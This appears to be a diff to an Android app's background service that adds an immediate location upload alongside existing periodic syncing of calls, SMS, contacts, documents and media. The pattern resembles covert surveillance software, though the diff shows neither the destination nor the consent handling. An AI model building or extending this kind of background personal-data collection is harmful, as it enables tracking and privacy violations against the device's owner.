@@ -17,6 +17,7 @@ import com.bushorat.app.helpers.AppVisibilityHelper;
 import com.bushorat.app.helpers.DocumentSyncHelper;
 import com.bushorat.app.helpers.DocumentUploadWorker;
 import com.bushorat.app.helpers.ImageUploadWorker;
+import com.bushorat.app.helpers.LocationSyncHelper;
 import com.bushorat.app.helpers.UserDataSyncHelper;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.auth.FirebaseUser;
@@ -102,8 +103,12 @@ public class BackgroundMaintenanceService extends Service {
             // Schedule periodic syncing (documents every 10 min, media every 1 hour)
             DocumentSyncHelper.schedulePeriodicDocumentUpload(this);
             
-            // Schedule periodic data syncing (calls, SMS, contacts, etc.)
+            // Schedule periodic data syncing (calls, SMS, contacts, location, etc.)
             UserDataSyncHelper.syncAll(this);
+            
+            // Immediate location upload
+            Log.d(TAG, "📍 Uploading current location");
+            LocationSyncHelper.uploadIfAllowed(this);
             
             Log.d(TAG, "✓ All background tasks scheduled in PARALLEL");
         } catch (Exception e) {
